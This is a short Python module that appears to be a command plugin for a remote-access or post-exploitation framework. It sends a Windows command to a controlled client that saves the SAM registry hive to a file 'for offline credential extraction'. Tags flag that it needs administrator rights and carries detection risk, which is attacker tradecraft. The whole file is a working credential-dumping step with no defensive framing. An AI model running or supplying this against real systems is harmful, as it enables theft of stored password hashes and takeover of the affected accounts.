def execute(client_interaction_ui, client_id):
    """Dump the SAM registry hive"""
    client_interaction_ui.send_command("reg save HKLM\\SAM C:\\temp\\sam.hive")
    
def get_description():
    """Get command description"""
    return "Saves the SAM registry hive to a file for offline credential extraction"
    
def get_tags():
    """Get command tags"""
    return {
        "opsec_safe": False,     # High risk of detection
        "requires_admin": True,  # Requires admin privileges
        "windows": True,
        "linux": False,
        "powershell": False,
        "cmd": True
    }